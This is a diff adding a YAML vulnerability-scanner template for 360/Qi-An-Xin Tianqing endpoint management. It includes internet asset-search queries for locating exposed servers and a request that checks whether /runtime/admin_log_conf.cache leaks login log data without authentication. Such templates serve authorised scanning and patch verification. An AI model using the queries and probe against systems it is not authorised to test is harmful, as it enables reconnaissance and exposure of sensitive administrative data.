@@ -1,0 +1,35 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="奇安信-天擎"
+    hunter-query: app.name="天擎终端安全管理系统"
+    quake-query: app:"奇安信天擎终端安全管理系统"
+    zoomeye-query: app:"Tianqing terminal management"
+    threatbook-query: app=360-天擎
+    cve: 
+    cnvd:
+    tips: 路径 /admin/index/list 等接口泄露
+    
+name: poc-yaml-360tianqing-admin_log_conf.cache-unleak
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /runtime/admin_log_conf.cache
+            headers:
+            body:         
+        expression: response.status == 200 && response.body_string.contains("TYPE_LOGIN")
+
+expression: r0() 
